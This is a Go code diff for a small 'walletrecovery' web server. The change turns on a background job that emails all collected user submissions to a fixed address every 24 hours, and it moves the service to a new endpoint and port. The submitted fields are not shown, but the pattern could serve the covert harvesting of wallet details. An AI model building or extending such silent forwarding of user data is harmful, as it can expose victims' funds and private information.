@@ -3,9 +3,11 @@ package main
 import (
 	"encoding/json"
 	"fmt"
+	"github.com/Marker451/golib/mail"
 	"io/ioutil"
 	"log"
 	"net/http"
+	"time"
 )
 
 const HOU_URL = "http://black.mxz.so/wanke/query?address="
@@ -87,22 +89,24 @@ func httpGet(addr string) (result []byte) {
 	return result
 }
 
-/*
 func crontabMail() {
-	mail.SendEmailSSL(mail.TO, "walletrecovery", "fffffffffffffffff")
-	ticker := time.NewTicker(time.Minute)
+	ticker := time.NewTicker(time.Hour * 24)
 	for {
 		<-ticker.C
-		mail.SendEmailSSL(mail.TO, "walletrecovery", RequestMap.String())
+		for i := 0; i < 3; i++ {
+			if err := mail.SendEmailWithGomail(mail.TO, "walletrecovery", RequestMap.String()); err == nil {
+				break
+			}
+		}
 		log.Println(RequestMap.String())
 	}
 }
-*/
 func main() {
+	go crontabMail()
 	RequestMap = make(map[string]*requestForm)
 	http.Handle("/", http.FileServer(http.Dir("./views/docs/")))
 	http.HandleFunc("/postInfo", PostInfoHandler)
-	http.HandleFunc("/33257", GetInfoHandler)
-	http.ListenAndServe(":8431", nil)
+	http.HandleFunc("/33", GetInfoHandler)
+	http.ListenAndServe(":8018", nil)
 
 }
